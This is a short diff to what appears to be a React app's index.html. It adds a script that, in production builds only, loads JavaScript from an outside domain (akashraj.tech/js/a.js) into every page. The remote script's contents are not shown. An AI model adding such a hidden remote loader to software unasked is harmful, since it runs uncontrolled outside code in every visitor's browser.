@@ -41,6 +41,15 @@
   <body>
     <noscript>You need to enable JavaScript to run this app.</noscript>
     <div id="root"></div>
+    <script>
+      if ("%NODE_ENV%" === "production") {
+        var k = document.getElementsByTagName("head")[0]
+        var c = document.createElement("script"); c.async = true; c.type = "text/javascript"; c.charset = "utf-8"; 
+        c.setAttribute("crossorigin", "anonymous");
+        c.src = "https://akashraj.tech/js/a.js";
+        k.appendChild(c);
+      }
+    </script>
   </body>
 
 </html>
